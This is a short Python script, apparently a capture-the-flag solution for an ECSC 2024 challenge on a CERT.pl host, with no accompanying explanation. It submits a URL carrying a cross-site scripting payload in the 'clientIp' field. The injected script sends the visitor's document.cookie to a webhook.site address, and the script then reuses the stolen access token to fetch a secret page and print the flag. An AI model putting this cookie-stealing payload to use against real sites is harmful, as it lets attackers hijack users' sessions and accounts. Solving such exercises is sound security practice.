import requests
import re

payload = "https://s69.ecsc24.hack.cert.pl/save?email=test@test.pl&password=test&fax=10&clientIp=\\\"><script>fetch(`https://webhook.site/b27decb1-c627-4672-b3c9-a8f3401be58b?c=${document.cookie}`, {mode: 'no-cors'})</script>"

requests.post('https://s69.ecsc24.hack.cert.pl/submit', data={
    'url': payload,
    'reason': 'test'
})

token = input('token: ')

res = requests.get('https://s69.ecsc24.hack.cert.pl/secret', cookies={
    'access_token': token
})

print(re.findall(r'ecsc24{.*}', res.text)[0])
